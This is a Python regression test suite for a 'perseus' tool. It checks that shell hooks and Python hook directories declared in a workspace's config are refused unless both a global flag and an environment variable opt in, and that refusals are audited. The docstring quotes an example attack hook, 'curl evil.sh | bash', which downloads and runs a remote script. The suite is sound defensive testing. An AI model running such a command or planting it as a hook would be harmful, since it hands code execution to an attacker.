"""
Regression suite for #168 — workspace-sourced shell hooks bypass trust gates.

Pre-v1.0.6: a workspace `.perseus/config.yaml` could declare
`hooks.on_render_start: ["curl evil.sh | bash"]` and the command would
run on the next `perseus render` — no `allow_query_shell`, no
`PERSEUS_ALLOW_DANGEROUS`, no audit. Attack: git clone a malicious
workspace, get pwned.

Fix (v1.0.6): workspace-sourced hooks (shell hooks AND `hooks.dir`
Python hooks) refused unless BOTH conditions met:
  1. Global config: `hooks.allow_workspace_sourced: true`
  2. Env: `PERSEUS_ALLOW_DANGEROUS=1`

These tests assert the gate works in both directions.
"""
import os
import json
from pathlib import Path

import pytest
import yaml
import perseus


def _make_workspace(tmp_path: Path, ws_cfg: dict | None = None) -> Path:
    ws = tmp_path / "ws"
    (ws / ".perseus").mkdir(parents=True)
    if ws_cfg is not None:
        (ws / ".perseus" / "config.yaml").write_text(yaml.safe_dump(ws_cfg))
    return ws


def _make_home(tmp_path: Path, global_cfg: dict | None = None) -> Path:
    home = tmp_path / "home" / ".perseus"
    home.mkdir(parents=True)
    if global_cfg is not None:
        (home / "config.yaml").write_text(yaml.safe_dump(global_cfg))
    return home


# ── 1. Workspace shell hooks refused by default ──────────────────────────────

def test_workspace_shell_hook_refused_by_default(tmp_path, monkeypatch):
    """#168 primary regression: workspace-sourced shell hook must NOT run."""
    home = _make_home(tmp_path)
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.delenv("PERSEUS_ALLOW_DANGEROUS", raising=False)

    marker = tmp_path / "marker_should_not_exist"
    ws = _make_workspace(tmp_path, {
        "hooks": {
            "on_render_start": [
                f"touch {marker}",
            ],
        },
    })

    cfg = perseus.load_config(workspace=ws)
    # Sanity: provenance should mark hooks as workspace-sourced
    assert cfg["_provenance"].get("hooks_workspace_sourced") is True

    # Fire the hook and assert the marker was NOT created.
    perseus._fire_hooks("on_render_start", {"workspace": str(ws)}, cfg)
    assert not marker.exists(), (
        "#168: workspace-sourced shell hook executed without opt-in. "
        f"Marker file was created at {marker}."
    )


def test_workspace_shell_hook_allowed_with_full_opt_in(tmp_path, monkeypatch):
    """With BOTH global opt-in and env var, workspace hook runs (intentional
    operator behavior)."""
    home = _make_home(tmp_path, {
        "hooks": {"allow_workspace_sourced": True},
    })
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setenv("PERSEUS_ALLOW_DANGEROUS", "1")

    marker = tmp_path / "marker_should_exist"
    ws = _make_workspace(tmp_path, {
        "hooks": {
            "on_render_start": [
                f"touch {marker}",
            ],
        },
    })

    cfg = perseus.load_config(workspace=ws)
    perseus._fire_hooks("on_render_start", {"workspace": str(ws)}, cfg)
    # Give shell a tick to create the file.
    import time
    time.sleep(0.1)
    assert marker.exists(), (
        "Full opt-in (global flag + env var) should allow workspace hook."
    )


def test_workspace_shell_hook_refused_with_only_global_opt_in(tmp_path, monkeypatch):
    """Global flag alone is insufficient — env var also required."""
    home = _make_home(tmp_path, {
        "hooks": {"allow_workspace_sourced": True},
    })
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.delenv("PERSEUS_ALLOW_DANGEROUS", raising=False)

    marker = tmp_path / "marker_should_not_exist_global_only"
    ws = _make_workspace(tmp_path, {
        "hooks": {"on_render_start": [f"touch {marker}"]},
    })

    cfg = perseus.load_config(workspace=ws)
    perseus._fire_hooks("on_render_start", {"workspace": str(ws)}, cfg)
    assert not marker.exists(), (
        "Global opt-in without env var should still refuse — defense in depth."
    )


def test_workspace_shell_hook_refused_with_only_env_var(tmp_path, monkeypatch):
    """Env var alone is insufficient — global flag also required."""
    home = _make_home(tmp_path)  # No global opt-in
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setenv("PERSEUS_ALLOW_DANGEROUS", "1")

    marker = tmp_path / "marker_should_not_exist_env_only"
    ws = _make_workspace(tmp_path, {
        "hooks": {"on_render_start": [f"touch {marker}"]},
    })

    cfg = perseus.load_config(workspace=ws)
    perseus._fire_hooks("on_render_start", {"workspace": str(ws)}, cfg)
    assert not marker.exists(), (
        "Env var without global opt-in should still refuse — defense in depth."
    )


# ── 2. Global-sourced shell hooks ALWAYS run ─────────────────────────────────

def test_global_shell_hook_runs_without_workspace_opt_in(tmp_path, monkeypatch):
    """Hooks declared in GLOBAL config bypass the workspace-sourced gate
    (the user owns global config; trust is implicit)."""
    marker = tmp_path / "marker_global_runs"
    home = _make_home(tmp_path, {
        "hooks": {
            "on_render_start": [f"touch {marker}"],
        },
    })
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.delenv("PERSEUS_ALLOW_DANGEROUS", raising=False)

    # No workspace config at all
    ws = _make_workspace(tmp_path)

    cfg = perseus.load_config(workspace=ws)
    # Provenance should NOT mark hooks as workspace-sourced
    assert not cfg["_provenance"].get("hooks_workspace_sourced", False)

    perseus._fire_hooks("on_render_start", {"workspace": str(ws)}, cfg)
    import time
    time.sleep(0.1)
    assert marker.exists(), (
        "Global-sourced hook should always run (without opt-in needed)."
    )


# ── 3. Provenance tracking ────────────────────────────────────────────────────

def test_provenance_tracks_hooks_workspace_source(tmp_path, monkeypatch):
    """Provenance map correctly identifies workspace-sourced hooks."""
    home = _make_home(tmp_path)
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))

    ws = _make_workspace(tmp_path, {
        "hooks": {"on_render_start": ["echo hi"]},
    })

    cfg = perseus.load_config(workspace=ws)
    assert cfg["_provenance"].get("hooks_workspace_sourced") is True


def test_provenance_does_not_flag_empty_hooks_section(tmp_path, monkeypatch):
    """Empty hooks section in workspace shouldn't trigger the gate."""
    home = _make_home(tmp_path)
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))

    ws = _make_workspace(tmp_path, {
        "hooks": {},
    })

    cfg = perseus.load_config(workspace=ws)
    # Empty dict should not count as "sourced"
    assert not cfg["_provenance"].get("hooks_workspace_sourced", False)


def test_provenance_no_workspace_section_not_flagged(tmp_path, monkeypatch):
    """Workspace config with no hooks section at all → no flag."""
    home = _make_home(tmp_path)
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))

    ws = _make_workspace(tmp_path, {
        "render": {"cache_dir": "~/.perseus/cache"},
    })

    cfg = perseus.load_config(workspace=ws)
    assert not cfg["_provenance"].get("hooks_workspace_sourced", False)


# ── 4. Audit trail ───────────────────────────────────────────────────────────

def test_workspace_shell_hook_refusal_audited(tmp_path, monkeypatch):
    """When a workspace shell hook is refused, an audit event is emitted."""
    home = _make_home(tmp_path)
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.delenv("PERSEUS_ALLOW_DANGEROUS", raising=False)

    ws = _make_workspace(tmp_path, {
        "hooks": {
            "on_render_start": ["echo MALICIOUS"],
        },
    })

    cfg = perseus.load_config(workspace=ws)
    cfg["audit"]["enabled"] = True
    perseus._fire_hooks("on_render_start", {"workspace": str(ws)}, cfg)

    audit_path = home / "audit_log.jsonl"
    assert audit_path.exists(), "Audit log was not created"
    entries = [json.loads(line) for line in audit_path.read_text().splitlines() if line.strip()]
    refusals = [e for e in entries if e.get("event_type") == "hooks_workspace_shell_refused"]
    assert len(refusals) >= 1, (
        f"No hooks_workspace_shell_refused event in audit log. "
        f"Events: {[e.get('event_type') for e in entries]}"
    )


# ── 5. Python hooks dir is also gated ────────────────────────────────────────

def test_workspace_python_hooks_dir_refused_by_default(tmp_path, monkeypatch):
    """register_hooks() refuses to load Python hooks from a workspace-sourced
    dir without opt-in."""
    home = _make_home(tmp_path)
    monkeypatch.setattr(perseus, "PERSEUS_HOME", home)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.delenv("PERSEUS_ALLOW_DANGEROUS", raising=False)

    # Point hooks.dir from workspace at a real directory with a hook file
    malicious_dir = tmp_path / "malicious_hooks"
    malicious_dir.mkdir()
    marker = tmp_path / "marker_python_should_not_run"
    (malicious_dir / "evil.py").write_text(
        f"open(r'{marker}', 'w').write('pwned')\n"
        "def on_render_start(payload):\n"
        "    pass\n"
    )

    ws = _make_workspace(tmp_path, {
        "hooks": {"dir": str(malicious_dir)},
    })

    cfg = perseus.load_config(workspace=ws)
    # Reset the hook loader cache so this test sees a fresh load.
    perseus._reset_hooks_cache()
    perseus.register_hooks(cfg, force=True)

    # The marker should NOT have been written because import was refused.
    assert not marker.exists(), (
        "#168: workspace-sourced hooks.dir was loaded without opt-in. "
        f"Top-level code in malicious_hooks/evil.py ran (marker at {marker})."
    )
